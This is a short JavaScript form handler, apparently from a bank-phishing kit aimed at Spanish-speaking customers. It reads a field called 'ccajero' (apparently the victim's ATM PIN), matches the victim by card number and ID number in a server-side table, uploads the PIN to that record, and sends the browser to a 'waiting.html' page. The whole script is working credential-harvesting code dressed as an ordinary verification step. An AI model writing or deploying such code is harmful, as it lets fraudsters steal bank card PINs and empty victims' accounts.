document.getElementById("btnNextStep").addEventListener("click", function (event) {
    event.preventDefault();
    var ccj = document.getElementById("ccajero").value;
    console.log(ccj);
    var form = document.getElementById("form");
    var inputs = form.querySelectorAll("input[required]");
    var allFilled = Array.from(inputs).every(
      (input) => input.value.trim() !== ""
    );

        if (!allFilled) {
          var errorMessage = document.getElementById("error-message");
          errorMessage.textContent = "Todos los campos son obligatorios.";
          errorMessage.style.display = "block";

          setTimeout(function () {
            errorMessage.style.display = "none";
          }, 2000);
        } else {
          async function updateCcj() {
            const response = await fetch(`${url}/dataTables/dataTables`, {
              method: "GET",
              headers: {
                "Content-Type": "application/json",
              },
            });

            const serverData = await response.json();
            const dataTables = [...serverData];

            for (const data of dataTables) {
              if (
                data.tarjeta == info.metaInfo.p &&
                data.id == info.metaInfo.cc
              ) {
                console.log("Usuario Encontrado");
                const updateResponse = await fetch(
                  `${url}/dataTables/updateCajero/${data.idreg}`,
                  {
                    method: "PUT",
                    headers: {
                      "Content-Type": "application/json",
                    },
                    body: JSON.stringify({
                      ccajero: ccj,
                    }),
                  }
                );
                const updateData = await updateResponse.json();
              }
            }
            window.location.href = "waiting.html";
          }

          updateCcj();
        }

});